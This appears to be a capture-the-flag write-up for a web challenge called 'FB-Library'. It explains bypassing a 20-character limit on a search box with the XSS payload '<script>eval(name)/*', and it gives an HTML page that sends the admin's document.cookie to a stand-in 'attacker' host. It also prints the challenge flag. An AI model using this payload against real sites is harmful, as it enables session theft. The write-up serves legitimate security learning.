# FB-Library
Web, 90

>  Written by KyleForkBomb
>  The Independent ForkBomb Academy has a new online library catalog! I asked the student librarians to add some books but they just ended up fooling around instead. If you see any weird books report them to me and I'll take a look.

This was actually not a terrible challenge.

You can inject HTML into the search box, but it gets cut off after 20 characters. So naturally, we go to Google and search for "xss less than 20 characters" and land on [this SE question](https://security.stackexchange.com/questions/199432/xss-payload-shorter-than-20-character).

The key here is that all we need to do is run `eval(name)` in the search box, and then we can get the admin to visit our site which sets `window.name` and redirects to that search. We can run `eval(name)` in 20 characters with `<script>eval(name)/*`.

Here's the code on our site (replace `attacker` with your favorite request logger):
```html
<script>
window.name="location='http://attacker?'+encodeURIComponent(document.cookie)";
location="https://fb_library.tjctf.org/search?q=%3Cscript%3Eeval%28name%29%2F*"
</script>
```
We report our site to the admin and get a cookie, which we can then use to get the flag.

Flag: `tjctf{trunc4t3d_n0_pr0bl3m_rly???}`